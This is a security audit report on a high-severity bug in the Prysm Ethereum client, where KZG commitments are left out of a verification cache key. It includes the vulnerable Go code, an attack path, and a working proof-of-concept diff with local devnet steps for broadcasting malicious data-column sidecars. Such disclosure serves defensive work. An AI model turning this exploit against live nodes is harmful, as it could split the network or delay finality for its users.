---
tags:
  - lang/solidity
  - platform/sherlock
  - has/github
  - has/poc
  - severity/high
  - sector/infra
  - sector/staking
protocol: "[[Fusaka]]"
auditors:
  - "[[alexfilippov314]]"
report: "https://github.com/sherlock-audit/2025-09-ethereum-fusaka-upgrade-judging"
genome:
  - "[[frozen-funds]]"
  - "[[temporary]]"
  - "[[dos-resistance]]"
  - "[[commitment-uniqueness]]"
---
# H-3: Prysm incorrectly caches the result of `verify_data_column_sidecar_inclusion_proof` check

- id: 64104
- impact: HIGH
- protocol: [[Fusaka]] Upgrade
- reporter: alexfilippov314 (Sherlock)
- source: N/A

## Summary


The bug report discusses an issue with the Prysm client for Ethereum, which can lead to a network-level split if not addressed. The issue arises because Prysm does not include `kzg_commitments` in the cache key, as suggested in the consensus spec. This means that all subsequent data column sidecars for the same block could contain arbitrary KZG commitments, allowing a malicious peer to exploit this bug as a DoS vector or cause a network split. The report includes a PoC and suggests adding `kzg_commitments` to the cache key as a possible mitigation.

## Details


Source: https://github.com/sherlock-audit/2025-09-ethereum-fusaka-upgrade-judging/issues/190 

## Found by 
alexfilippov314

### Summary

Consensus spec states that:
> In the verify_data_column_sidecar_inclusion_proof(sidecar) check, for all the sidecars of the same block, it verifies against the same set of kzg_commitments of the given beacon block. Client can choose to cache the result of the arguments tuple (sidecar.kzg_commitments, sidecar.kzg_commitments_inclusion_proof, sidecar.signed_block_header).

The issue arises because Prysm does not include `kzg_commitments` in the cache key, as suggested in the spec. The relevant Prysm code can be seen [here](https://github.com/OffchainLabs/prysm/blob/f690af81fafdd2c9bebe77c5de35784034ba0a5d/beacon-chain/verification/data_column.go#L527-L547):
```go
func inclusionProofKey(c blocks.RODataColumn) ([160]byte, error) {
	var key [160]byte
	if len(c.KzgCommitmentsInclusionProof) != 4 {
		// This should be already enforced by ssz unmarshaling; still check so we don't panic on array bounds.
		return key, columnErrBuilder(ErrSidecarInclusionProofInvalid)
	}

	root, err := c.SignedBlockHeader.HashTreeRoot()
	if err != nil {
		return [160]byte{}, columnErrBuilder(errors.Wrap(err, "hash tree root"))
	}

	for i := range c.KzgCommitmentsInclusionProof {
		if copy(key[32*i:32*i+32], c.KzgCommitmentsInclusionProof[i]) != 32 {
			return key, columnErrBuilder(ErrSidecarInclusionProofInvalid)
		}
	}

	copy(key[128:], root[:])
	return key, nil
}
```
This means that all subsequent data column sidecars for the same block could contain arbitrary KZG commitments (commitments that do not correspond to the block). As long as such a sidecar passes KZG verification against these arbitrary commitments, Prysm will accept it, store it, and rebroadcast it.

As a result, Prysm nodes could accept a block even if its blobs are not available. 

### Root Cause

Prysm does not include `kzg_commitments` in the cache key [here](https://github.com/OffchainLabs/prysm/blob/f690af81fafdd2c9bebe77c5de35784034ba0a5d/beacon-chain/verification/data_column.go#L527-L547).

### Internal Pre-conditions

-

### External Pre-conditions

-

### Attack Path

A malicious peer (not necessarily the proposer) could broadcast data-column sidecars whose commitments do not correspond to the block. Prysm nodes that have already cached a positive inclusion-proof result will accept such sidecars and rebroadcast them. Once Prysm nodes begin relaying invalid sidecars, their gossip scores start to decay and they get pruned from honest meshes. Over time this can create a soft split: Prysm nodes largely peer with each other, lose reach into honest subnets, and may track a head that honest clients reject due to failed DA checks.

In addition, a malicious peer could exploit this bug as a DoS vector, since the number of KZG commitments is effectively capped at 4096 due to this issue. This allows a malicious peer to force sidecar receivers to perform expensive computations.

### Impact

I believe the worst possible impact is a network-level split of Prysm nodes from the rest of the network. If Prysm’s share exceeds 33%, finality could be lost or significantly delayed.

### PoC

1. Apply the following diff on top of this commit (0ea5e2cf9da520c515752600b949a37858a4954d):
```diff
diff --git a/beacon-chain/rpc/prysm/v1alpha1/validator/proposer.go b/beacon-chain/rpc/prysm/v1alpha1/validator/proposer.go
index 11908874e..6e9e6294d 100644
--- a/beacon-chain/rpc/prysm/v1alpha1/validator/proposer.go
+++ b/beacon-chain/rpc/prysm/v1alpha1/validator/proposer.go
@@ -9,6 +9,7 @@ import (
 
 	builderapi "github.com/OffchainLabs/prysm/v6/api/client/builder"
 	"github.com/OffchainLabs/prysm/v6/beacon-chain/blockchain"
+	"github.com/OffchainLabs/prysm/v6/beacon-chain/blockchain/kzg"
 	"github.com/OffchainLabs/prysm/v6/beacon-chain/builder"
 	"github.com/OffchainLabs/prysm/v6/beacon-chain/cache"
 	"github.com/OffchainLabs/prysm/v6/beacon-chain/core/feed"
@@ -502,8 +503,44 @@ func (vs *Server) broadcastAndReceiveDataColumns(
 ) error {
 	verifiedRODataColumns := make([]blocks.VerifiedRODataColumn, 0, len(roSidecars))
 	eg, _ := errgroup.WithContext(ctx)
+
+	var maliciousBlob kzg.Blob
+	maliciousBlob[1] = 0x01
+	cellsAndProofs, err := kzg.ComputeCellsAndKZGProofs(&maliciousBlob)
+	log.WithError(err).Info("[POC] Computed malicious cells and proofs")
+	commitment, err := kzg.BlobToKZGCommitment(&maliciousBlob)
+	log.WithError(err).Info("[POC] Computed commitment")
+
 	for _, roSidecar := range roSidecars {
 		// We build this block ourselves, so we can upgrade the read only data column sidecar into a verified one.
+
+		if roSidecar.Index > 42 {
+			log.Infof("[POC] Modifying data column sidecar before broadcasting/receiving it %d", roSidecar.Index)
+
+			column := make([][]byte, len(roSidecar.Column))
+			copy(column, roSidecar.Column)
+			column[0] = cellsAndProofs.Cells[roSidecar.Index][:]
+
+			kzgCommitments := make([][]byte, len(roSidecar.KzgCommitments))
+			copy(kzgCommitments, roSidecar.KzgCommitments)
+			kzgCommitments[0] = commitment[:]
+
+			kzgProofs := make([][]byte, len(roSidecar.KzgProofs))
+			copy(kzgProofs, roSidecar.KzgProofs)
+			kzgProofs[0] = cellsAndProofs.Proofs[roSidecar.Index][:]
+
+			sidecar := ethpb.DataColumnSidecar{
+				Index:                        roSidecar.Index,
+				Column:                       column,
+				KzgCommitments:               kzgCommitments,
+				KzgProofs:                    kzgProofs,
+				SignedBlockHeader:            roSidecar.SignedBlockHeader,
+				KzgCommitmentsInclusionProof: roSidecar.KzgCommitmentsInclusionProof,
+			}
+
+			roSidecar, _ = blocks.NewRODataColumn(&sidecar)
+		}
+
 		verifiedRODataColumn := blocks.NewVerifiedRODataColumn(roSidecar)
 		verifiedRODataColumns = append(verifiedRODataColumns, verifiedRODataColumn)
 

```
2. Build local prysm image:
```
bazel build //cmd/beacon-chain:oci_image_tarball
docker load -i bazel-bin/cmd/beacon-chain/oci_image_tarball/tarball.tar
docker tag gcr.io/offchainlabs/prysm/beacon-chain:latest prysm/beacon:local
```
3. Run the local network with the following configuration:
```
participants:
  # presumably malicious node
  - cl_type: prysm
    cl_image: prysm/beacon:local
    vc_image: ethpandaops/prysm-validator:develop
    el_type: geth
    el_extra_params: ["--nodiscover", "--maxpeers=0"]
    el_extra_env_vars: {"GETH_MAXPEERS": "0"}
  - cl_type: prysm
    cl_image: ethpandaops/prysm-beacon-chain:develop
    el_type: geth
    supernode: true
  - cl_type: prysm
    cl_image: ethpandaops/prysm-beacon-chain:develop
    el_type: geth
    supernode: true
  - cl_type: prysm
    cl_image: ethpandaops/prysm-beacon-chain:develop
    el_type: geth
    supernode: true
  - cl_type: nimbus
    cl_image: ethpandaops/nimbus-eth2:unstable
    el_type: geth
    supernode: true
network_params:
 fulu_fork_epoch: 1
```
4. Wait until block 32 to ensure that Fulu is active
5. Send the following blob transaction to the first EL node. This ensures that the blob transaction will be proposed by the malicious node and that the blobs will not be delivered via the EL.
```
cast send --private-key bcdf20249abf0ed6d944c0288fad489e33f66b3960d9e6229c1cd214ed3bbe31 --rpc-url 127.0.0.1:32769 0x0000000000000000000000000000000000000000 --blob --path <(head -c 131072 /dev/urandom) --gas-limit 300000
```
6. All Prysm nodes will accept the block with this transaction despite the data being unavailable. Nimbus, however, will not accept the block and will split from the rest of the network

This PoC deliberately uses a setup with a Prysm supermajority, as it better demonstrates the bug. As mentioned earlier, on mainnet it is likely that Prysm nodes would be quarantined from the rest of the network instead.

### Mitigation

Consider including `kzg_commitments` in the cache key [here](https://github.com/OffchainLabs/prysm/blob/f690af81fafdd2c9bebe77c5de35784034ba0a5d/beacon-chain/verification/data_column.go#L527-L547).
